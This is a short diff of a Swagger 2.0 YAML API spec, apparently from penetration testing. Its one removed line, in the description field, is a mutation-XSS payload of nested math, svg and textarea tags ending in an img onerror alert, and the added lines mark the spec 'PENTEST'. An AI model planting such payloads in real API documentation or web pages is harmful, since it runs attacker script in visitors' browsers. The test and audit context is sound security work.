@@ -2,13 +2,13 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+     PENTEST
 paths:
   /accounts:
     get:
       responses:
         '200':
-          description: No response was specified
+          description: Descrição pentest
       tags:
         - accounts
       operationId: findAccounts
